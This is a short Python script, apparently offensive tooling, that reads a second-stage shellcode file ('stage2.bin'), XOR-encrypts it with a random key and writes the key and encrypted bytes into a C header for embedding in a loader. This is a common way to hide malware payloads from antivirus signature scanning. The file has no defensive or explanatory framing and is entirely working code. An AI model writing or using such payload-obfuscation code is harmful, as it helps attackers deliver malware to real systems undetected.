# shellcode_obfuscate.py
import os, sys

def xor(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

shellcode = open("stage2.bin", "rb").read()
key = os.urandom(16)
enc = xor(shellcode, key)

with open("shellcode.h", "w") as f:
    f.write("static const unsigned char key[16] = {")
    f.write(",".join(str(b) for b in key) + "};\n")
    f.write("static const unsigned char sc[{}]=".format(len(enc)))
    f.write("{")
    f.write(",".join(str(b) for b in enc))
    f.write("};")
